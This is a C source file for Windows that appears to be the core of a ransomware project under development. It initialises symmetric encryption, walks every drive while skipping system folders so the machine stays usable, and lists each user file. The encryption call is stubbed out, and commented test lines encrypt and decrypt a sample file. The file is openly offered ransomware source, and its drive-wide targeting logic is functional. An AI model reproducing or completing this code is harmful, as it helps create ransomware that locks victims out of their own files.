#include <stdio.h>
#include <windows.h>
#include <wincrypt.h>
#include <string.h>
#include "crypto.h"
#pragma comment(lib, "advapi32.lib")

char queue[8192][260];


int main() {
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    BYTE *keyBlob;
    BYTE *ivBlob;

    FILE *fptr;
    WIN32_FIND_DATA ffd;
    char scanPath[260];
    char path[260];
    char drives[256];
    int head = 0, tail = 0;
    size_t byteRead;
    unsigned char *buffer;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    DWORD result = GetLogicalDriveStringsA(sizeof(drives), drives);
    if (result == 0) {
        printf("[!] Can't get drivers.");
        return 1;
    }
    char* drive = drives;
    InitializeSymmetricCrypto(&hProv, &hKey, &keyBlob);
    
    // FileEncrypt("C:\\Users\\Admin\\Documents\\ransomware\\test\\passwd.txt", hProv, hKey);
    // char key[33];
    // scanf("%s", key);
    // hKey = ImportKey(key, hProv);
    // FileDecrypt("C:\\Users\\Admin\\Documents\\ransomware\\test\\passwd.txt.enc", hProv, hKey);

    while (*drive != '\0') {
        printf("%s\n", drive);
        strcpy(queue[tail], drive);
        tail = (tail + 1) % 8192;
        while (tail != head) {
            char currentParentPath[260];
            strcpy(currentParentPath, queue[head]);
            head = (head + 1) % 8192;
            sprintf(scanPath, "%s*", currentParentPath);
            hFind = FindFirstFile(scanPath, &ffd);
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (strcmp(ffd.cFileName, "..") == 0 || strcmp(ffd.cFileName, ".") == 0) {
                        continue;
                    }                    
                    if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                        if (strcmp(ffd.cFileName, "Windows") == 0 || 
                            strcmp(ffd.cFileName, "Program Files") == 0 || 
                            strcmp(ffd.cFileName, "Program Files (x86)") == 0 ||
                            strcmp(ffd.cFileName, "MinGW") == 0 ||
                            strcmp(ffd.cFileName, "AppData") == 0) {
                            continue;
                        }
                        sprintf(path, "%s%s\\", currentParentPath, ffd.cFileName);
                        printf("[DIR]  %s\n", path);
                        strcpy(queue[tail], path);
                        tail = (tail + 1) % 8192;
                    } else {
                        sprintf(path, "%s%s", currentParentPath, ffd.cFileName);
                        // EncryptFile()
                        long long fileSize = ((long long)ffd.nFileSizeHigh << 32 | ffd.nFileSizeLow);
                        printf("[FILE] %s - %ld bytes\n", path, fileSize);
                    }
                } while (FindNextFile(hFind, &ffd) != 0);
            }
            FindClose(hFind);
        }
        head = tail = 0;
        drive += strlen(drive) + 1;
    }
    
    FinalizeSymmetricCrypto(&hProv, &hKey, &keyBlob);
    getchar();
    return 0;
}